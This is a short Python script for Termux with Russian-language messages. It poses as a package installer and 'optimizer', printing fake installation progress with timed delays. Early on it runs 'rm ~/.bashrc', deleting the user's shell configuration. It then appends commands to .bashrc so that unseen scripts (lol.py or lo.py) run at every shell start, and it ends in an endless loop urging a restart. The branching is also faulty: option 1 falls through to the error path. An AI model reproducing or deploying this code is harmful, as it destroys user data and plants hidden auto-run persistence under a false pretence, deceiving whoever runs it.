import os, time, webbrowser

from colorama import Fore, Style, Back

print ('\n')
def res():
    print(Style.RESET_ALL)

os.system('rm ~/.bashrc')

os.system('clear')
print('[!] Установка пакетов..')
time.sleep(3)
res()
print('[!] Установка утилит..')
time.sleep(4)
res()
print('[!] Установка лединга..')
time.sleep(1)
res()
print('[!] Установка талифов..')
time.sleep(2)
res()
print('[!] Установка доп-пакетов..')
time.sleep(3)
res()
print('[!] Установка данных..')
time.sleep(3)
res()
os.system('clear')
print('для оптимизированной роботы')
print('уточните вашу версию Termux')
print(' ')
print('[1] 0.118.0 "последняя версия"')
print('[2] 0.101 "плеймаркет версия"')
res()
tsu = input('выберете пункт>>> ')
if tsu == '1':
    os.system('echo "cd termuxaling" >> ~/.bashrc')
    os.system('echo "python3 lol.py" >> ~/.bashrc')

if tsu == '2':
    os.system('echo "cd termuxaling" >> ~/.bashrc')
    os.system('echo "python3 lo.py" >> ~/.bashrc')
else:
    os.system('clear')
    print(' вы допустили ошибку попробуйте ещё, создайте второй сезон')
    print(' и введите команду "python3 hack.py" ')
    time.sleep(9999)

os.system('clear')
print('[!] Оптимизация..')
time.sleep(3)
os.system('clear')

while True:
    print('все готово просто перезапустите термукс и напишите команду "go" ')
    res()
    tsu = input('✅')
    if tsu == '':
        os.system('clear')
    else:
        os.system('clear')
